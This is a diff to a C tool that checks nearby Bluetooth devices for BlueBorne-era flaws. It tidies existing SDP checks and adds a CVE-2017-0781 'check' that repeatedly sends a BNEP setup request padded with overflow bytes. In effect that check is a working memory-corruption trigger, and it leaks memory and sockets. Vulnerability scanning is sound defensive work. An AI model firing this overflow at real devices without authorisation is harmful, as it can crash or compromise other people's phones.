@@ -166,7 +166,7 @@ int is_vulnerable_to_cve_2017_0785(bdaddr_t *target)
 
     addr.l2_bdaddr = *target;
     addr.l2_family = AF_BLUETOOTH;
-    addr.l2_psm = htobs(1);
+    addr.l2_psm = htobs(SDP_PSM);
 
     // Create inital SDP service search PDU
     pdu = create_sdp_svc_search_pdu(SVC_L2CAP, 0x00, continuation_len);
@@ -182,7 +182,7 @@ int is_vulnerable_to_cve_2017_0785(bdaddr_t *target)
 
     // Extract continuation state.  If the continuation state is not extracted, it is a Bluetooth 
     // stack that is not vulnerable
-    if ((continuation_len = extract_android_cont_state_from_sdp(cont_state, buf)) < 0)
+    if ((continuation_len = extract_android_cont_state_from_sdp(cont_state, buf)) == UINT8_ERR)
         return 0;
     
     free(pdu);
@@ -205,6 +205,38 @@ int is_vulnerable_to_cve_2017_0785(bdaddr_t *target)
     return (pdu_header->pdu_id != svc_search_rsp) ? 0 : 1;
 }
 
+int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
+{
+    struct sockaddr_l2 addr = { 0 };
+    int sd, i;
+    const uint8_t overflow_payload_val = 0x41;
+    char *packet = (char *) malloc(sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN);
+    struct bnep_setup_conn_req *conn_req;
+    
+    // Return a negative integer indicating failure to create socket
+    if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
+        return CVE_CHECK_ERR;
+
+    addr.l2_bdaddr = *target;
+    addr.l2_family = AF_BLUETOOTH;
+    addr.l2_psm = htobs(BNEP_PSM);
+
+    conn_req = (struct bnep_setup_conn_req *) packet;
+    conn_req->type = BNEP_CONTROL_W_EXTENSION;
+    conn_req->ctrl = BNEP_SETUP_CONN_REQ;
+    conn_req->uuid_size = 0;
+
+    memset(&(conn_req->service), overflow_payload_val, BNEP_OVERFLOW_PAYLOAD_LEN);
+
+    if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+        return CVE_CHECK_ERR;
+    for (int i = 0; i < BNEP_OVERFLOW_LOOP_LIMIT; i++)
+        if (write(sd, packet, sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN) < 0)
+            return CVE_CHECK_ERR;
+    close(sd);
+    return 0;
+}
+
 int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
 {
     struct sockaddr_l2 addr = { 0 };
@@ -224,7 +256,7 @@ int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
 
     addr.l2_bdaddr = *target;
     addr.l2_family = AF_BLUETOOTH;
-    addr.l2_psm = htobs(1);
+    addr.l2_psm = htobs(SDP_PSM);
 
     // Create initial SDP Service Attribute Search request
     pdu = create_sdp_svc_attr_search_pdu(SVC_L2CAP, 0x00, continuation_len);
